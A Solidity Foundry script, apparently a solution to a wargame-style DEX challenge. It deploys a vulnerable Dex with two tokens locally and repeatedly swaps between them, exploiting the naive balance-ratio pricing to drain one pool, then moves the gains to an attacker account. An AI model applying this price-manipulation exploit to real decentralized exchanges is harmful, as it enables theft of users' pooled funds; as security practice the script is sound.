// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract DexHack is Script {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;
    address public eoa = address(1024);

    function run() public {
        dex = new Dex();

        vm.startPrank(eoa);
        token1 = new SwappableToken(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", 110);

        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);
        token1.transfer(address(this), 10);
        token2.transfer(address(this), 10);
        vm.stopPrank();

        dex.setTokens(address(token1), address(token2));
        token1.approve(address(this), address(dex), type(uint256).max);
        token2.approve(address(this), address(dex), type(uint256).max);
        console.log(
            "Before: token1 - %s, token2 - %s",
            token1.balanceOf(address(dex)),
            token2.balanceOf(address(dex))
        );

        // start attacking
        address[2] memory tokens = [dex.token1(), dex.token2()];
        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;

        uint256 from = 0;
        uint256 to = 1;
        while (true) {
            hackBalances = [
                SwappableToken(tokens[from]).balanceOf(address(this)),
                SwappableToken(tokens[to]).balanceOf(address(this))
            ];

            dexBalances = [
                SwappableToken(tokens[from]).balanceOf(address(dex)),
                SwappableToken(tokens[to]).balanceOf(address(dex))
            ];
            uint256 swapPrice = dex.getSwapPrice(
                tokens[from],
                tokens[to],
                hackBalances[0]
            );
            if (swapPrice > dexBalances[1]) {
                dex.swap(tokens[from], tokens[to], dexBalances[0]);
                break;
            } else {
                dex.swap(tokens[from], tokens[to], hackBalances[0]);
            }
            from = 1 - from;
            to = 1 - to;
        }

        console.log(
            "After: token1 - %d, token2 - %d",
            token1.balanceOf(address(dex)),
            token2.balanceOf(address(dex))
        );
        // transfer tokens from contract to eoa
        token1.transfer(eoa, token1.balanceOf(address(this)));
        token2.transfer(eoa, token2.balanceOf(address(this)));
    }
}
